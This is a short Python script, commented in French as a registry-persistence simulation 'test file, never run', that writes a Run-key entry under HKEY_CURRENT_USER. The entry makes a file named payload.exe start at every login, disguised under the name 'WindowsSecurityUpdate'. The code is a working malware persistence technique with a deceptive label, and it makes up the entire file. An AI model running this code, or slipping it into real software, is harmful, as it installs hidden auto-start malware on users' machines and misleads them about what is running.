# Simulation de persistance via registre Windows — fichier de test uniquement, ne jamais exécuter
import winreg
import os

malware_path = os.path.abspath("payload.exe")

key = winreg.OpenKey(
    winreg.HKEY_CURRENT_USER,
    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    0,
    winreg.KEY_SET_VALUE,
)
winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, malware_path)
winreg.CloseKey(key)
